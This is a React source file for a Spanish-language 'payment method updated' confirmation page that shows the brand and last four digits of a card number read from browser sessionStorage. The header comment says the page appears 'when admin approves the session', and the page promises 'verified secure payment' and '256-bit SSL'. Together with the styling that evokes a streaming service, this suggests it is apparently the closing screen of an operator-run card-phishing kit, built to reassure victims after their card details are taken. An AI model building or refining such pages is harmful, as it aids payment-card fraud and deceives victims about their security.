/**
 * Payment Success Page
 * Shown when admin approves the session - "Método de pago actualizado exitosamente"
 */

import { useEffect, useState } from "react";

export default function PaymentSuccess() {
  const [showCheck, setShowCheck] = useState(false);
  const [last4, setLast4] = useState("****");
  const [cardBrand, setCardBrand] = useState("VISA");

  useEffect(() => {
    setTimeout(() => setShowCheck(true), 300);

    // Get card number from sessionStorage to show last 4 digits
    const cardNumber = sessionStorage.getItem("sp_card_number") || "";
    const cleanCard = cardNumber.replace(/\s/g, "");
    if (cleanCard.length >= 4) {
      setLast4(cleanCard.slice(-4));
    }

    // Detect card brand from first digits
    if (cleanCard.startsWith("4")) {
      setCardBrand("VISA");
    } else if (cleanCard.startsWith("5") || cleanCard.startsWith("2")) {
      setCardBrand("MC");
    } else if (cleanCard.startsWith("3")) {
      setCardBrand("AMEX");
    }
  }, []);

  const brandColors = {
    VISA: "from-blue-600 to-blue-400",
    MC: "from-red-600 to-orange-400",
    AMEX: "from-blue-800 to-blue-500",
  };

  return (
    <div className="min-h-[100dvh] bg-black flex items-center justify-center p-4 safe-area-inset">
      <div className="w-full max-w-md text-center px-2 sm:px-0">
        {/* Success Animation */}
        <div className={`transition-all duration-700 ${showCheck ? "scale-100 opacity-100" : "scale-50 opacity-0"}`}>
          <div className="w-20 h-20 sm:w-24 sm:h-24 mx-auto mb-4 sm:mb-6 rounded-full bg-gradient-to-br from-green-500/20 to-emerald-500/20 border-2 border-green-500/40 flex items-center justify-center">
            <svg className="w-10 h-10 sm:w-12 sm:h-12 text-green-400" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2.5}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
            </svg>
          </div>
        </div>

        <h1 className="text-xl sm:text-2xl font-bold text-white mb-2 sm:mb-3">
          Método de Pago Actualizado
        </h1>
        <p className="text-gray-400 text-xs sm:text-sm mb-6 sm:mb-8">
          Tu método de pago ha sido verificado y actualizado exitosamente. Ya puedes disfrutar de todo el contenido sin interrupciones.
        </p>

        {/* Success card */}
        <div className="bg-gray-900/60 border border-gray-800 rounded-xl p-6 mb-6">
          <div className="flex items-center justify-center gap-3 mb-4">
            <div className={`w-10 h-7 bg-gradient-to-r ${brandColors[cardBrand as keyof typeof brandColors] || brandColors.VISA} rounded-md flex items-center justify-center`}>
              <span className="text-white text-[10px] font-bold">{cardBrand}</span>
            </div>
            <span className="text-gray-300 text-sm">•••• •••• •••• {last4} verificada</span>
          </div>
          <div className="flex items-center justify-center gap-2 text-green-400 text-xs">
            <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
            </svg>
            <span>Pago seguro verificado</span>
          </div>
        </div>

        <button
          onClick={() => window.location.href = '/'}
          className="w-full bg-gradient-to-r from-red-600 to-red-500 hover:from-red-500 hover:to-red-400 text-white font-semibold py-3.5 rounded-lg transition-all active:scale-[0.97]"
        >
          Volver al inicio
        </button>

        <p className="text-gray-600 text-[10px] mt-6">
          🔒 Transacción protegida con encriptación SSL de 256 bits
        </p>
      </div>
    </div>
  );
}
